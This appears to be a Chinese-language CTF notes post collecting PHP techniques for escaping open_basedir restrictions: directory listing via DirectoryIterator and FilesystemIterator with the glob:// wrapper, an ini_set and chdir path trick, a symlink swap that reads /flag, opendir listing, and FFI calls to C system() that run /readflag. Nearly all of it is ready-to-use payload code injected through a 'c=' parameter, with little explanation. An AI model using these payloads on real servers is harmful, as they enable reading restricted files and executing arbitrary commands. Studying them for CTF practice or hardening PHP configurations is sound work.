---
title: interesting3
date: 2023-07-26 23:13:35
categories:
- 网络安全
tags:
- web 
description: |
    php and java 
---
## PHP

### next

#### 绕过open_basedir，glob协议

- 利用DirectoryIterator类对象+glob://协议获取目录结构，能够突破open_basedir的限制

```php
    <?php
        print_r(ini_get('open_basedir').'<br>');
        $dir_array = array();
        
        $dir = new DirectoryIterator('glob:///*');
        foreach($dir as $d){
            $dir_array[] = $d->__toString();
        }
        
        $dir = new DirectoryIterator('glob:///.*');
        foreach($dir as $d){
            $dir_array[] = $d->__toString();
        }
        
        sort($dir_array);
        foreach($dir_array as $d){
            echo $d.' ';
        }
    ?>
```

- FilesystemIterator类 + glob://协议

```php
<?php
print_r(ini_get('open_basedir').'<br>');
$dir_array = array();

$dir = new FilesystemIterator('glob:///*');
foreach($dir as $d){
    $dir_array[] = $d->__toString();
}

$dir = new FilesystemIterator('glob:///.*');
foreach($dir as $d){
    $dir_array[] = $d->__toString();
}

sort($dir_array);
foreach($dir_array as $d){
    echo $d.' ';
}
show_source(__FILE__);

?>
```

利用

- ini_set() + 相对路径

```php
    <?php
        show_source(__FILE__);
        print_r(ini_get('open_basedir').'<br>');
        
        mkdir('test');
        chdir('test');
        ini_set('open_basedir','..');
        chdir('..');
        chdir('..');
        chdir('..');
        ini_set('open_basedir','/');
        
        echo file_get_contents('/flag');

    ?>
```

- symlink是软连接，通过偷梁换柱的方法绕过open_basedir

```php
<?php
    show_source(__FILE__);
    
    mkdir("1");chdir("1");
    mkdir("2");chdir("2");
    mkdir("3");chdir("3");
    mkdir("4");chdir("4");
    
    chdir("..");chdir("..");chdir("..");chdir("..");
    
    symlink("1/2/3/4","tmplink");
    symlink("tmplink/../../../../flag","bypass");
    unlink("tmplink");
    mkdir("tmplink");
    echo file_get_contents("bypass");
?>
```

- glob://协议

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");} exit(0);
另外还有一种形式：
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) { echo($f->__toString().' '); } exit(0); ?>
```

- opendir

```php
c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; }; exit(0);
```

#### FFI扩展

```php
#7.4以上的php版本可以使用FFI，即外部函数接口，是指在一种语言里调用另一种语言代码的技术
#PHP的FFI扩展就是一个让你在PHP里调用C代码的技术

c=
$ffi=FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
exit();

#上面第一句表示创建一个system对象
#第三句通过$ffi去调用system函数

#或者用这个：
c=
$ffi=FFI::cdef("int system(const char *command);");
$ffi->system("/readflag > 1.txt");
exit();
```
